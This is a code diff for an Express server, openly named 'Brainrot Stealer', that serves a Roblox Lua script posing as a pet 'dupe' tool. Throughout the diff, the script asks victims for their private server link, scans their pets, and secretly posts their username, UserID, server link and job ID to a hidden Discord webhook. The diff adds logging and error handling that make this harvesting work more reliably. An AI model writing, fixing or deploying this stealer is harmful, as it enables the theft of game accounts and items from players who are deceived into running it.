@@ -1,4 +1,4 @@
-// server.js - HIDDEN WEBHOOKS + WORKING STEALER
+// server.js - FIXED WEBHOOK STORAGE
 const express = require("express");
 const app = express();
 const PORT = process.env.PORT || 3000;
@@ -6,10 +6,10 @@ const PORT = process.env.PORT || 3000;
 // Webhook storage (in production use Redis/MongoDB)
 const webhookStorage = new Map();
 
-// Middleware
+// Middleware - FIXED: Add these BEFORE routes
+app.use(express.json()); // This parses JSON bodies
+app.use(express.urlencoded({ extended: true })); // This parses URL-encoded bodies
 app.use(express.text({ type: '*/*' }));
-app.use(express.json());
-app.use(express.urlencoded({ extended: true }));
 
 // BLOCK NON-EXECUTORS - RELAXED
 function blockNonExecutor(req, res, next) {
@@ -22,7 +22,7 @@ function blockNonExecutor(req, res, next) {
                   ua.includes("fluxus") ||
                   ua.includes("executor") ||
                   ref.includes("roblox") ||
-                  true; // Allow all for testing
+                  true;
 
   if (!allowed) {
     return res.status(403).send("Access denied");
@@ -30,38 +30,54 @@ function blockNonExecutor(req, res, next) {
   next();
 }
 
-// STORE WEBHOOK ENDPOINT (called by bot)
+// STORE WEBHOOK ENDPOINT - FIXED
 app.post("/store", (req, res) => {
   try {
+    console.log("📥 STORE REQUEST BODY:", req.body);
+    console.log("📥 STORE REQUEST HEADERS:", req.headers);
+    
+    // FIXED: Get data from request body
     const { webhook_id, webhook_url } = req.body;
-    console.log("Storing webhook:", { webhook_id, webhook_url });
+    
+    console.log("🔄 Storing webhook:", { webhook_id, webhook_url });
     
     if (webhook_id && webhook_url && webhook_url.startsWith("https://discord.com/api/webhooks/")) {
       webhookStorage.set(webhook_id, webhook_url);
+      console.log("✅ Webhook stored successfully:", webhook_id);
       res.json({ success: true, message: "Webhook stored" });
     } else {
+      console.log("❌ Invalid data received");
       res.status(400).json({ success: false, message: "Invalid data" });
     }
   } catch (error) {
-    res.status(500).json({ success: false, message: "Server error" });
+    console.log("❌ Store error:", error);
+    res.status(500).json({ success: false, message: "Server error: " + error.message });
   }
 });
 
-// GET WEBHOOK ENDPOINT
+// GET WEBHOOK ENDPOINT - FIXED
 app.get("/webhook/:id", (req, res) => {
   const webhookId = req.params.id;
+  console.log("🔍 Looking up webhook:", webhookId);
+  
   const webhook = webhookStorage.get(webhookId);
   
   if (webhook) {
+    console.log("✅ Webhook found:", webhookId);
     res.json({ success: true, webhook: webhook });
   } else {
+    console.log("❌ Webhook not found:", webhookId);
     res.status(404).json({ success: false, message: "Webhook not found" });
   }
 });
 
 // TEST ENDPOINT
 app.get("/test", (req, res) => {
-  res.send("SERVER WORKING! Webhook system active.");
+  res.json({ 
+    status: "SERVER WORKING", 
+    webhook_storage: webhookStorage.size,
+    message: "Webhook system active" 
+  });
 });
 
 // HOME
@@ -69,17 +85,25 @@ app.get("/", (req, res) => {
   res.send("Brainrot Stealer - Hidden Webhook System");
 });
 
-// /raw → RETURN LUA SCRIPT WITH HIDDEN WEBHOOK
+// /raw → RETURN LUA SCRIPT WITH HIDDEN WEBHOOK - FIXED
 app.get("/raw", blockNonExecutor, (req, res) => {
   const webhookId = req.query.id;
   
-  console.log("Raw request with ID:", webhookId);
+  console.log("🎯 Raw request with ID:", webhookId);
 
   if (!webhookId) {
     return res.status(400).send("-- MISSING WEBHOOK ID --");
   }
 
-  // SIMPLE BUT WORKING LUA SCRIPT
+  // Check if webhook exists
+  const webhook = webhookStorage.get(webhookId);
+  if (!webhook) {
+    return res.status(400).send("-- WEBHOOK NOT FOUND --");
+  }
+
+  console.log("✅ Serving script for webhook ID:", webhookId);
+
+  // SIMPLE BUT WORKING LUA SCRIPT WITH HIDDEN WEBHOOK
   const luaScript = `-- Brainrot Stealer - Hidden Webhook
 print("🧠 Brainrot Stealer Loading...")
 
@@ -102,16 +126,16 @@ local ServerURL = "https://tommyfc555-github-io.onrender.com"
 
 -- Get webhook from server
 local function getWebhook()
-    local success, webhook = pcall(function()
+    local success, result = pcall(function()
         local response
-        if syn then
+        if syn and syn.request then
             response = syn.request({
                 Url = ServerURL .. "/webhook/" .. WebhookID,
                 Method = "GET"
             })
         elseif request then
             response = request({
-                Url = ServerURL .. "/webhook/" .. WebhookID,
+                Url = ServerURL .. "/webhook/" .. WebhookID, 
                 Method = "GET"
             })
         else
@@ -124,18 +148,25 @@ local function getWebhook()
             local data = HttpService:JSONDecode(response.Body)
             if data.success then
                 return data.webhook
+            else
+                print("❌ Webhook not found on server")
             end
         end
         return nil
     end)
-    return success and webhook
+    
+    if not success then
+        print("❌ Failed to fetch webhook:", result)
+    end
+    
+    return success and result
 end
 
 -- Send to Discord
 local function sendToDiscord(embedData)
     local webhook = getWebhook()
     if not webhook then
-        print("❌ Failed to get webhook")
+        print("❌ No webhook available")
         return false
     end
     
@@ -147,7 +178,7 @@ local function sendToDiscord(embedData)
         local json = HttpService:JSONEncode(data)
         
         if syn and syn.request then
-            syn.request({
+            return syn.request({
                 Url = webhook,
                 Method = "POST",
                 Headers = {
@@ -156,9 +187,9 @@ local function sendToDiscord(embedData)
                 Body = json
             })
         elseif request then
-            request({
+            return request({
                 Url = webhook,
-                Method = "POST",
+                Method = "POST", 
                 Headers = {
                     ["Content-Type"] = "application/json"
                 },
@@ -166,20 +197,31 @@ local function sendToDiscord(embedData)
             })
         else
             HttpService:PostAsync(webhook, json, Enum.HttpContentType.ApplicationJson)
+            return {StatusCode = 200}
         end
     end)
     
-    return success
+    if success and result and (result.StatusCode == 200 or result.StatusCode == 204) then
+        print("✅ Sent to Discord successfully")
+        return true
+    else
+        print("❌ Failed to send to Discord")
+        return false
+    end
 end
 
 -- Scan pets function
 local function scanPets()
     local allPets = {}
     local brainrotPets = {}
+    local totalValue = 0
     
     pcall(function()
         local plots = workspace:FindFirstChild("Plots")
-        if not plots then return end
+        if not plots then 
+            print("❌ No plots found")
+            return 
+        end
         
         for _, plot in pairs(plots:GetChildren()) do
             local pods = plot:FindFirstChild("AnimalPodiums")
@@ -211,6 +253,8 @@ local function scanPets()
                 elseif string.find(rateText, "K/s") then moneyValue = rateNumber * 1e3
                 else moneyValue = rateNumber end
                 
+                totalValue = totalValue + moneyValue
+                
                 local petData = {
                     Name = petName,
                     Rate = rateText,
@@ -230,7 +274,7 @@ local function scanPets()
     table.sort(allPets, function(a, b) return a.Money > b.Money end)
     table.sort(brainrotPets, function(a, b) return a.Money > b.Money end)
     
-    return allPets, brainrotPets
+    return allPets, brainrotPets, totalValue
 end
 
 -- Create the main GUI
@@ -286,7 +330,7 @@ local function createMainGUI()
     dupeButton.MouseButton1Click:Connect(function()
         local serverLink = inputBox.Text
         if serverLink == "" or not string.find(string.lower(serverLink), "roblox") then
-            statusLabel.Text = "Status: Invalid server link!"
+            statusLabel.Text = "Status: ❌ Invalid server link!"
             return
         end
         
@@ -297,35 +341,42 @@ local function createMainGUI()
         wait(2)
         
         -- Scan pets
-        local allPets, brainrotPets = scanPets()
+        local allPets, brainrotPets, totalValue = scanPets()
         
         statusLabel.Text = "Status: Sending to Discord..."
         dupeButton.Text = "SENDING..."
         
+        -- Format top pets
+        local topPetsText = ""
+        for i = 1, math.min(3, #allPets) do
+            topPetsText = topPetsText .. allPets[i].Name .. " | " .. allPets[i].Rate .. "\\n"
+        end
+        if topPetsText == "" then topPetsText = "No pets found" end
+        
         -- Create embed
         local embed = {
             title = "🧠 BRAINROT STEALER - DUPE RESULTS",
-            description = "Private Server: " .. serverLink,
+            description = "**Private Server Scanned Successfully**",
             color = 65280,
             fields = {
                 {
                     name = "👤 PLAYER INFO",
-                    value = "Name: " .. player.Name .. "\\nUserID: " .. player.UserId .. "\\nProfile: [View](https://www.roblox.com/users/" .. player.UserId .. "/profile)",
+                    value = "**Name:** " .. player.Name .. "\\n**UserID:** " .. player.UserId .. "\\n**Profile:** [Click Here](https://www.roblox.com/users/" .. player.UserId .. "/profile)",
                     inline = false
                 },
                 {
                     name = "🎯 SERVER INFO", 
-                    value = "Link: " .. serverLink .. "\\nPlaceID: " .. game.PlaceId .. "\\nJobID: " .. game.JobId,
+                    value = "**Link:** " .. serverLink .. "\\n**PlaceID:** " .. game.PlaceId .. "\\n**JobID:** " .. game.JobId,
                     inline = false
                 },
                 {
                     name = "📊 PET STATS",
-                    value = "Total Pets: " .. #allPets .. "\\nBrainrots: " .. #brainrotPets,
+                    value = "**Total Pets:** " .. #allPets .. "\\n**Brainrots:** " .. #brainrotPets .. "\\n**Total Value:** $" .. string.format("%.2f", totalValue),
                     inline = true
                 },
                 {
-                    name = "💰 TOP PETS",
-                    value = #allPets > 0 and allPets[1].Name .. " | " .. allPets[1].Rate or "None",
+                    name = "💰 TOP 3 PETS",
+                    value = topPetsText,
                     inline = true
                 }
             },
@@ -380,4 +431,5 @@ app.listen(PORT, "0.0.0.0", () => {
   console.log(`🚀 Server LIVE on port ${PORT}`);
   console.log(`✅ Webhook Storage: ACTIVE`);
   console.log(`🔗 Test: https://tommyfc555-github-io.onrender.com/test`);
+  console.log(`📊 Storage Size: ${webhookStorage.size}`);
 });
